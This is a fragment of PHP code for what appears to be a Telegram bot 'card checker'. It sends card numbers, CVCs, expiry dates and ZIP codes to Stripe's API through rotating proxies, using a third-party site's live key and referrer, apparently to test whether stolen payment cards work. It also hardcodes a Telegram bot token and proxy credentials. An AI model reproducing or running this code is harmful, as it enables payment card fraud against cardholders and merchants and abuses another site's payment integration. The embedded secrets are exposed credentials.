...
///https://api.telegram.org/bot1817246635:AAHadKvVYV-3khrYw5YC_yZZJfUKTUVFUeM/setwebhook?url=<url>



$botToken = "1817246635:AAHadKvVYV-3khrYw5YC_yZZJfUKTUVFUeM"; // Enter ur bot token
...
$rp1 = array(
  1 => 'jlrhwmja-rotate:hwkyb0180enx'
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=16b9fd6f-1ba0-4ff5-9a2b-b25476a88fce1c276a&muid=70bd7ef4-bf1e-4bd8-8774-d048599692024c148d&sid=31e5cd52-f624-464d-83e5-f28237a0aee98f7f3d&pasted_fields=number&payment_user_agent=stripe.js%2F4fed1d7c9%3B+stripe-js-v3%2F4fed1d7c9&time_on_page=225586&referrer=https%3A%2F%2Fslowmotionrec.bandcamp.com%2Fsubscribe&key=pk_live_9pN0YBTvepWvgabtcaIds06A');
